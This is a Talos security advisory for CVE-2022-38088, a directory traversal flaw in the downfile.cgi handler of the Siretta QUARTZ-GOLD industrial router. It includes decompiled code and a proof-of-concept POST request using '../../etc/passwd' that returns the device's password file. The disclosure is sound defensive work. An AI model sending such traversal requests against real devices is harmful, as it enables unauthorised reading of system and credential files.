# Talos Vulnerability Report

### TALOS-2022-1609

## Siretta QUARTZ-GOLD httpd downfile.cgi directory traversal vulnerability

##### January 26, 2023

##### CVE Number

CVE-2022-38088

##### SUMMARY

A directory traversal vulnerability exists in the httpd downfile.cgi functionality of Siretta QUARTZ-GOLD G5.0.1.5-210720-141020. A specially-crafted HTTP request can lead to arbitrary file read. An attacker can send an HTTP request to trigger this vulnerability.

##### CONFIRMED VULNERABLE VERSIONS

The versions below were either tested or verified to be vulnerable by Talos or confirmed to be vulnerable by the vendor.

Siretta QUARTZ-GOLD G5.0.1.5-210720-141020

##### PRODUCT URLS

QUARTZ-GOLD - <https://www.siretta.com/products/industrial-routers/4g-lte-router/gigabit-ethernet-small-footprint-lte-router-eu/>

##### CVSSv3 SCORE

4.9 - CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N

##### CWE

CWE-22 - Improper Limitation of a Pathname to a Restricted Directory (‘Path Traversal’)

##### DETAILS

The Siretta QUARTZ-GOLD is an industrial cellular router with several features and services, such as: SSH, UPNP, VPN, SNMP and many others.

The QUARTZ-GOLD router has a web server with several functionalities, a subset of which are related to the management of external files. Indeed, the web-server offers API for uploading files, downloading them, and also deleting if no longer required.

Following the API to download a previously uploaded file:

```
void downfile.cgi(void)

{
  [...]

  _filename_param = (char *)webcgi_safeget("_filename");                                                        [1]
  filename = "";
  if (_filename_param != (char *)0x0) {
    filename = _filename_param;
  }
  [... calculate base_folder ...]
  if (*filename != '\0') {
    sprintf(buff,"Content-Disposition:attachment;filename=\"%s\"",(char)filename);
    send_header(200,buff,"application/tomato-binary-file",0);
    sprintf(buff,"%s/%s",base_folder,filename);                                                                 [2]
    do_file(buff);                                                                                              [3]
  }
  return;
}

```

The `downfile.cgi` expects one parameter called `_filename` that represents the filename of the desired file to be downloaded. At `[1]` the uploaded parameter is taken and then used at `[2]` to compose the string `<base_folder>/<_filename>`. Then, at `[3]`, the specified file is sent in the HTTP response. From `[1]` to `[2]` no sanitization for the `_filename` parameter is performed, which can lead to a path traversal vulnerability, allowing an attacker to download any file of the file system.

### Exploit Proof of Concept

Sending the following request to the web server:

```
POST /downfile.cgi HTTP/1.1
Authorization: Basic <a valid basic auth>
Content-Length: 55

_filename=../../etc/passwd&_http_id=<the correct tid>

```

Would result in the web server sending the following response:

```
HTTP/1.0 200 OK
Date: Sat, 01 Jan 2000 03:33:42 GMT
Content-Type: application/tomato-binary-file
Cache-Control: no-cache, no-store, must-revalidate, private
Expires: Thu, 31 Dec 1970 00:00:00 GMT
Pragma: no-cache
Content-Disposition:attachment;filename="../../etc/passwd"
Connection: close

root:x:0:0:root:/root:/bin/sh
admin:x:0:0:admin:/root:/bin/sh
nobody:x:65534:65534:nobody:/dev/null:/dev/null

```

The response for this request is the contents of `/etc/passwd`.
